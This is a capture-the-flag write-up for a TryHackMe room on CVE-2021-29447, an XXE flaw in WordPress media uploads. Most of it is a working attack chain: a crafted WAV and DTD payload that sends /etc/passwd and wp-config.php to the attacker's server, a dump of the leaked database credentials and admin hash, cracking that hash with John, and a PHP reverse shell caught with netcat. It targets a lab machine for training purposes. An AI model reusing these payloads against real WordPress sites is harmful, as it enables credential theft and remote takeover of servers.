## Wordpress: CVE-2021-29447 - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/wordpresscve202129447)

**IP: 10.10.91.214**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## üìå General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Web, SQL <br>

**Tools Used**: Nmap, John<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## üîç Enumeration

- Scan the machine while creating payloads.

  ```
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 f0:65:b8:42:b7:c3:ba:8e:fe:e4:3c:cd:57:f1:29:2e (RSA)
  |   256 42:1e:1b:8f:19:38:99:2e:36:70:cf:0e:b6:31:92:14 (ECDSA)
  |_  256 8e:89:43:de:5d:9b:99:66:c4:2a:93:17:f3:0e:e1:f4 (ED25519)
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Tryhackme &#8211; Just another WordPress site
  |_http-generator: WordPress 5.6.2
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
  | ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
  | Not valid before: 2021-05-26T21:23:31
  |_Not valid after:  2031-05-24T21:23:31
  |_ssl-date: TLS randomness does not represent time
  | mysql-info: 
  |   Protocol: 10
  |   Version: 5.7.33-0ubuntu0.16.04.1
  |   Thread ID: 46
  |   Capabilities flags: 65535
  |   Some Capabilities: SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, [SNIP!] SupportsMultipleStatments, SupportsMultipleResults
  |   Status: Autocommit
  |   Salt: ci4\x18s\x07\x10WNl6|WER=gbN%
  |_  Auth Plugin Name: mysql_native_password
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

---

## üåê Web Exploitation 

- Create these 2 payloads that were explained at the beginning of the room.

  ```
  echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://[YOUR-THM-IP]:PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

  nano evil.dtd
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://[YOUR-THM-IP]:PORT/?p=%file;'>" >
  ```
  
- Now visit the admin page `/wp-login` and login with credentials `test-corp:test`. Start a PHP server and upload the `payload.wav` from `Media` section. You should get encoded response as soon as you upload the payload.

  ```
  php -S 0.0.0.0:4444
  [Sun May 25 20:23:29 2025] PHP 8.4.4 Development Server (http://0.0.0.0:4444) started
  [Sun May 25 20:23:49 2025] 10.10.157.7:40420 Accepted
  [Sun May 25 20:23:49 2025] 10.10.157.7:40420 [200]: GET /evil.dtd
  [Sun May 25 20:23:49 2025] 10.10.157.7:40420 Closing
  [Sun May 25 20:23:49 2025] 10.10.157.7:40422 Accepted
  [Sun May 25 20:23:49 2025] 10.10.157.7:40422 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oiy9naWLCw6L33N0dXg6L2Jpbi9iYXNoCnNzaGQ6eDoxMDg6NjU1MzQ6[SNIP!]3Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo= - No such file or directory
  [Sun May 25 20:23:49 2025] 10.10.157.7:40422 Closing
  [Sun May 25 20:23:49 2025] 10.10.157.7:40424 Accepted
  [Sun May 25 20:23:49 2025] 10.10.157.7:40424 [200]: GET /evil.dtd
  [Sun May 25 20:23:49 2025] 10.10.157.7:40424 Closing
  [Sun May 25 20:23:50 2025] 10.10.157.7:40426 Accepted
  [Sun May 25 20:23:50 2025] 10.10.157.7:40426 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxO3lzdGVzZQpzdHV4Ong6M[SNIP!]G9naW4KbXlzcWw6eDoxMDk6MTE3Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo= - No such file or directory
  [Sun May 25 20:23:50 2025] 10.10.157.7:40426 Closing
  ```
  
- When you decode this string you will see `/etc/passwd` which confirms that exploit works and that server is vulnerable.

  ```
  echo '[STRING]' | base64 -d
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
  systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
  systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
  syslog:x:104:108::/home/syslog:/bin/false
  _apt:x:105:65534::/nonexistent:/bin/false
  messagebus:x:106:110::/var/run/dbus:/bin/false
  uuidd:x:107:111::/run/uuidd:/bin/false
  stux:x:1000:1000:CVE-2021-29447,,,:/home/stux:/bin/bash
  sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
  mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
  ```

- Now repeat the same thing again, just change the `resource` from `/etc/passwd` to `/var/www/html/wp-config.php` in the payload `evil.dtd` or whatever you named it. After decoding the string you should have full database info.

  ```
  // ** MySQL settings - You can get this info from your web host ** //
  /** The name of the database for WordPress */
  define( 'DB_NAME', 'wordpressdb2' );
  
  /** MySQL database username */
  define( 'DB_USER', 'thedarktangent' ); 
  
  /** MySQL database password */
  define( 'DB_PASSWORD', 'sUp3rS3cret132' );
  
  /** MySQL hostname */
  define( 'DB_HOST', 'localhost' );
  
  /** Database Charset to use in creating database tables. */
  define( 'DB_CHARSET', 'utf8' );
  
  /** The Database Collate type. Don't change this if in doubt. */
  define( 'DB_COLLATE', '' );
  
  /**#@+
   * Authentication Unique Keys and Salts.
   *
   * Change these to different unique phrases!
   * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
   * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
   *
   * @since 2.6.0
   */
  define( 'AUTH_KEY',         'put your unique phrase here' );
  define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
  define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
  define( 'NONCE_KEY',        'put your unique phrase here' );
  define( 'AUTH_SALT',        'put your unique phrase here' );
  define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
  define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
  define( 'NONCE_SALT',       'put your unique phrase here' );
  
  /**#@-*/
  
  /**
   * WordPress Database Table prefix.
   *
   * You can have multiple installations in one database if you give each
   * a unique prefix. Only numbers, letters, and underscores please!
   */
  $table_prefix = 'wptry_';
  
  /**
   * For developers: WordPress debugging mode.
   *
   * Change this to true to enable the display of notices during development.
   * It is strongly recommended that plugin and theme developers use WP_DEBUG
   * in their development environments.
   *
   * For information on other constants that can be used for debugging,
   * visit the documentation.
   *
   * @link https://wordpress.org/support/article/debugging-in-wordpress/
   */
  define( 'WP_DEBUG', false );
  
  /* That's all, stop editing! Happy publishing. */
  define('WP_HOME', false);
  define('WP_SITEURL', false);
  
  /** Absolute path to the WordPress directory. */
  if ( ! defined( 'ABSPATH' ) ) {
          define( 'ABSPATH', __DIR__ . '/' );
  }
  
  /** Sets up WordPress vars and included files. */
  require_once ABSPATH . 'wp-settings.php';
  ```

- Now let's connect with MySQL and get credentials for admin account.

  ```
  mysql -h 10.10.91.214 -u thedarktangent -p  

  Enter password: 
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MySQL connection id is 136
  Server version: 5.7.33-0ubuntu0.16.04.1 (Ubuntu)
  
  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
  
  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
  
  MySQL [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | mysql              |
  | performance_schema |
  | sys                |
  | wordpressdb2       |
  +--------------------+
  5 rows in set (0.267 sec)
  
  MySQL [(none)]> use wordpressdb2
  Reading table information for completion of table and column names
  You can turn off this feature to get a quicker startup with -A
  
  Database changed
  
  MySQL [wordpressdb2]> show tables
      -> ;
  +--------------------------+
  | Tables_in_wordpressdb2   |
  +--------------------------+
  | wptry_commentmeta        |
  | wptry_comments           |
  | wptry_links              |
  | wptry_options            |
  | wptry_postmeta           |
  | wptry_posts              |
  | wptry_term_relationships |
  | wptry_term_taxonomy      |
  | wptry_termmeta           |
  | wptry_terms              |
  | wptry_usermeta           |
  | wptry_users              |
  +--------------------------+
  12 rows in set (0.257 sec)
  
  MySQL [wordpressdb2]> describe wptry_users
      -> ;
  +---------------------+---------------------+------+-----+---------------------+----------------+
  | Field               | Type                | Null | Key | Default             | Extra          |
  +---------------------+---------------------+------+-----+---------------------+----------------+
  | ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
  | user_login          | varchar(60)         | NO   | MUL |                     |                |
  | user_pass           | varchar(255)        | NO   |     |                     |                |
  | user_nicename       | varchar(50)         | NO   | MUL |                     |                |
  | user_email          | varchar(100)        | NO   | MUL |                     |                |
  | user_url            | varchar(100)        | NO   |     |                     |                |
  | user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
  | user_activation_key | varchar(255)        | NO   |     |                     |                |
  | user_status         | int(11)             | NO   |     | 0                   |                |
  | display_name        | varchar(250)        | NO   |     |                     |                |
  +---------------------+---------------------+------+-----+---------------------+----------------+
  10 rows in set (0.259 sec)
  
  MySQL [wordpressdb2]> select user_pass from wptry_users where id=1;
  +------------------------------------+
  | user_pass                          |
  +------------------------------------+
  | $P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1 |
  +------------------------------------+
  1 row in set (0.255 sec)
  
  MySQL [wordpressdb2]> select user_nicename from wptry_users where id=1;
  +---------------+
  | user_nicename |
  +---------------+
  | corp-001      |
  +---------------+
  1 row in set (0.287 sec)
  ```

- Crack that hash and login as admin on `wp-login`.

  ```
  echo '$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1' > hash.txt

  cat hash.txt   
  $P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1
  
  john --wordlist=/rockyou.txt hash.txt                   
  Using default input encoding: UTF-8
  Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
  Cost 1 (iteration count) is 8192 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  teddybear        (?)     
  1g 0:00:00:00 DONE (2025-05-25 21:06) 25.00g/s 14400p/s 14400c/s 14400C/s jeffrey..parola
  Use the "--show --format=phpass" options to display all of the cracked passwords reliably
  Session completed.
  ```

---

## ‚öôÔ∏è Shell Access

- After you login, you must upload the shell through `Theme` section since `Media` section will deny it. When you upload it, it will say that it can't be installed but you can still find a shell in `Media`.

- Find the shell in `Media` and click on it to get the full path. I used classic PentestMonkey `php-reverse-shell.php`.

  ```
  file url: /wp-content/uploads/2025/05/monkey.php

  10.10.91.214/wp-content/uploads/2025/05/monkey.php
  
  nc -lvnp 4444                          
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.91.214] 53830
  Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
   13:23:17 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Read the flag and assert dominance.

  ```
  $ find / -name flag.txt 2>/dev/null
  /home/stux/flag/flag.txt
  
  $ cat home/stux/flag/flag.txt   
  thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}
  ```
  
- This one was pretty cool, cya in the next one!

---

## üèÅ Flags

- **User Flag**: `thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}`

---

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, just learning new stuff.`

- What did I learn?
  `New vulnerability and exploitation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü

---
